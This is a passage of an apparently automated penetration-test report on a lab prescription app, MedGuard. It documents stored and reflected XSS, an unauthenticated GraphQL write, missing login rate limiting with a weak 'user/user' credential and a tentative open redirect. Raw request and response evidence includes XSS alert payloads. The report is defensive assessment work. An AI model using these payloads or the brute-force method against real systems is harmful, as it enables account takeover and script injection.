+2. POST same endpoint/headers, body {&quot;query&quot;:&quot;mutation { addPrescription(prescriptionDetails: \&quot;&lt;img src=x onerror=alert('amr-7731a')&gt;\&quot;, userId: 1) { prescription { id userId prescriptionDetails } } }&quot;} -&gt; HTTP 200, creates id=100 under userId=1 (ev-mqxfg6z4-44).
+3. Replay with marker amr-7731b -&gt; HTTP 200, creates id=101 under userId=1 (ev-mqxfg8as-45).
+4. Both writes target victim userId=1 (Admin) without any authentication.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxffgp0-42</code> — <code>artifacts/s-0004/ev-mqxffgp0-42/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;:&quot;mutation { addPrescription(prescriptionDetails: \&quot;VERDICT-NOFIELD\&quot;) }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 400
+connection: close
+content-length: 288
+content-type: application/json
+date: Sun, 28 Jun 2026 06:47:30 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;errors&quot;:[{&quot;message&quot;:&quot;Field \&quot;addPrescription\&quot; of type \&quot;AddPrescription\&quot; must have a sub selection.&quot;,&quot;locations&quot;:[{&quot;line&quot;:1,&quot;column&quot;:12}]},{&quot;message&quot;:&quot;Field \&quot;addPrescription\&quot; argument \&quot;userId\&quot; of type \&quot;Int!\&quot; is required but not provided.&quot;,&quot;locations&quot;:[{&quot;line&quot;:1,&quot;column&quot;:12}]}]}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxfg6z4-44</code> — <code>artifacts/s-0004/ev-mqxfg6z4-44/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;:&quot;mutation { addPrescription(prescriptionDetails: \&quot;&lt;img src=x onerror=alert('amr-7731a')&gt;\&quot;, userId: 1) { prescription { id userId prescriptionDetails } } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 130
+content-type: application/json
+date: Sun, 28 Jun 2026 06:48:04 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;addPrescription&quot;:{&quot;prescription&quot;:{&quot;id&quot;:100,&quot;userId&quot;:1,&quot;prescriptionDetails&quot;:&quot;&lt;img src=x onerror=alert('amr-7731a')&gt;&quot;}}}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxfg8as-45</code> — <code>artifacts/s-0004/ev-mqxfg8as-45/</code></div><div class="lbl">REQUEST</div><pre>POST /graphql HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;
+
+{&quot;query&quot;:&quot;mutation { addPrescription(prescriptionDetails: \&quot;&lt;img src=x onerror=alert('amr-7731b')&gt;\&quot;, userId: 1) { prescription { id userId prescriptionDetails } } }&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 130
+content-type: application/json
+date: Sun, 28 Jun 2026 06:48:06 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;data&quot;:{&quot;addPrescription&quot;:{&quot;prescription&quot;:{&quot;id&quot;:101,&quot;userId&quot;:1,&quot;prescriptionDetails&quot;:&quot;&lt;img src=x onerror=alert('amr-7731b')&gt;&quot;}}}}</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 5. [rate-limit] Login endpoint has no rate limiting/lockout and accepts weak guessable credentials</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">POST /login (JSON {username,password}) applies no rate limiting, throttling, or account lockout: 10+ rapid failed authentication attempts against the same account all returned a normal 401 {&quot;message&quot;:&quot;Invalid credentials&quot;} with no 429, delay, CAPTCHA, or lockout ever triggered (e.g. evidence ev-mqxehepd-1n, ev-mqxek32h-1w, ev-mqxek48k-1x, ev-mqxek4w0-1y, ev-mqxemhrq-21, ev-mqxemih3-22). This makes credential brute-forcing trivial, and the account 'user' uses the guessable password 'user' — a wrong guess is rejected (401, 34 bytes) while the guessed credential is accepted (200 {&quot;message&quot;:&quot;Login successful&quot;,&quot;userID&quot;:2}, 42 bytes, sets a Flask session cookie). On a healthcare/prescription app this enables account takeover. Note also: the success response discloses the internal userID (2), and the session cookie is set HttpOnly but without Secure or SameSite attributes.</div>
+<div><b>Reproduction</b></div><pre>1. Send many POST /login requests with Content-Type: application/json and {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;wrongN&quot;} as fast as possible. Observe every response is 401 &quot;Invalid credentials&quot; — no 429/lockout/delay even after 10+ attempts (ev-mqxehepd-1n and the burst ev-mqxek32h-1w/ev-mqxek48k-1x/ev-mqxek4w0-1y/ev-mqxemhrq-21/ev-mqxemih3-22). 2. Negative control: POST /login {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;wrongpassword123&quot;} → 401, 34 bytes (guess rejected). 3. Positive: POST /login {&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;user&quot;} → 200 {&quot;message&quot;:&quot;Login successful&quot;,&quot;userID&quot;:2}, 42 bytes, Set-Cookie session=... — repeatable (ev-mqxeiy17-1t, ev-mqxemfai-1z). The absence of any rate limiting means an attacker can iterate guesses freely until the weak credential is found.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxehepd-1n</code> — <code>artifacts/s-0001/ev-mqxehepd-1n/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;wrongpassword123&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 401
+connection: close
+content-length: 34
+content-type: application/json
+date: Sun, 28 Jun 2026 06:21:01 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+{&quot;message&quot;:&quot;Invalid credentials&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxeiy17-1t</code> — <code>artifacts/s-0001/ev-mqxeiy17-1t/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;user&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 42
+content-type: application/json
+date: Sun, 28 Jun 2026 06:22:13 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+{&quot;message&quot;:&quot;Login successful&quot;,&quot;userID&quot;:2}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxemfai-1z</code> — <code>artifacts/s-0001/ev-mqxemfai-1z/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/json
+
+{&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;user&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 42
+content-type: application/json
+date: Sun, 28 Jun 2026 06:24:55 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+{&quot;message&quot;:&quot;Login successful&quot;,&quot;userID&quot;:2}</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 6. [burp] Open redirection (DOM-based)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The application may be vulnerable to DOM-based open redirection. Data is read from &lt;b&gt;input.value&lt;/b&gt; and passed to &lt;b&gt;fetch.body&lt;/b&gt;. (confidence: TENTATIVE) @ http://target.local:5003/login</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxgk39c-5s</code> — <code>artifacts/_/ev-mqxgk39c-5s/</code></div><div class="lbl">REQUEST</div><pre>GET /login HTTP/1.1
+Host: target.local:5003
+
+GET /login HTTP/1.1
+Host: target.local:5003
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.3 Python/3.8.17
+Date: Sun, 28 Jun 2026 07:17:45 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2579
+Vary: Cookie
+Connection: close
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;MedGuard&lt;/title&gt;
+    &lt;link href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; 
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;MedGuard&lt;/a&gt;
+        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+            &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+        &lt;/button&gt;
+        &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+            &lt;ul class=&quot;navbar-nav&quot;&gt;
+                
+                
+                &lt;li class=&quot;nav-item&quot;&gt;
+                    &lt;a class=&quot;nav-link&quot; href=&quot;/login&quot;&gt;Login&lt;/a&gt;
+                &lt;/li&gt;
+                
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container mt-4&quot;&gt;
+        
+&lt;h1&gt;Login&lt;/h1&gt;
+&lt;div class=&quot;login-form&quot;&gt;
+    &lt;input type=&quot;text&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot;&gt;
+    &lt;input type=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; style=&quot;margin-top: 10px;&quot;&gt;
+    &lt;button class=&quot;btn btn-primary&quot; style=&quot;margin-top: 10px;&quot; onclick=&quot;login()&quot;&gt;Login&lt;/button&gt;
+    &lt;p id=&quot;login-message&quot; class=&quot;mt-2&quot;&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+    function login() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        fetch('/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username, password }),
+        })
+        .then(response =&gt; response.json())
+        .then(data =&gt; {
+            if (data.message === &quot;Login successful&quot;) {
+                localStorage.setItem('userID', data.userID);
+                document.getElementById('login-message').innerText = &quot;Login successful!&quot;;
+                window.location.href = &quot;/add_prescription&quot;;
+            } else {
+                document.getElementById('login-message').innerText = &quot;Invalid credentials&quot;;
+            }
+        });
+    }
+&lt;/script&gt;
+
+    &lt;/div&gt;
+
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 7. [burp] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The value of the &lt;b&gt;query&lt;/b&gt; JSON parameter is copied into the application's response. (confidence: CERTAIN) @ http://target.local:5003/graphql</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxgk39n-5t</code> — <code>artifacts/_/ev-mqxgk39n-5t/</code></div><div class="lbl">REQUEST</div><pre>GET /graphql HTTP/1.1
+Host: target.local:5003
+
+POST /graphql HTTP/1.1
+Host: target.local:5003
+Content-Type: application/json
+Content-Length: 16
+Accept: */*
+
+{&quot;query&quot;:&quot;testefhwosigv1&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 400 BAD REQUEST
+Server: Werkzeug/3.0.3 Python/3.8.17
+Date: Sun, 28 Jun 2026 07:17:49 GMT
+Content-Type: application/json
+Content-Length: 153
+Connection: close
+
+{&quot;errors&quot;:[{&quot;message&quot;:&quot;Syntax Error GraphQL (1:1) Unexpected Name \&quot;testefhwosigv1\&quot;\n\n1: testefhwosigv1\n   ^\n&quot;,&quot;locations&quot;:[{&quot;line&quot;:1,&quot;column&quot;:1}]}]}</pre></div>
+</div>
+<div class="f" id="finding-8">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 8. [burp] Cross-site scripting (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The value of the &lt;b&gt;query&lt;/b&gt; JSON parameter is copied into the HTML document as plain text between tags. The payload &lt;b&gt;dlki4&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;iht1p&lt;/b&gt; was submitted in the query JSON parameter. This input was echoed unmodified in the application's response.&lt;br&gt;&lt;br&gt;This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.&lt;br&gt;&lt;br&gt;The request uses a Content-type header which it is not possible to generate using a standard HTML form. Burp attempted to replace this header with a standard value, to facilitate c @ http://target.local:5003/graphql</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxgk39s-5u</code> — <code>artifacts/_/ev-mqxgk39s-5u/</code></div><div class="lbl">REQUEST</div><pre>GET /graphql HTTP/1.1
+Host: target.local:5003
+
+POST /graphql HTTP/1.1
+Host: target.local:5003
+Content-Type: application/json
+Content-Length: 16
+Accept: */*
+
+{&quot;query&quot;:&quot;testdlki4&lt;script&gt;alert(1)&lt;\/script&gt;iht1p&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 400 BAD REQUEST
+Server: Werkzeug/3.0.3 Python/3.8.17
+Date: Sun, 28 Jun 2026 07:17:49 GMT
+Content-Type: application/json
+Content-Length: 173
+Connection: close
+
+{&quot;errors&quot;:[{&quot;message&quot;:&quot;Syntax Error GraphQL (1:1) Unexpected Name \&quot;testdlki4\&quot;\n\n1: testdlki4&lt;script&gt;alert(1)&lt;/script&gt;iht1p\n   ^\n&quot;,&quot;locations&quot;:[{&quot;line&quot;:1,&quot;column&quot;:1}]}]}</pre></div>
+</div>
+</body></html>
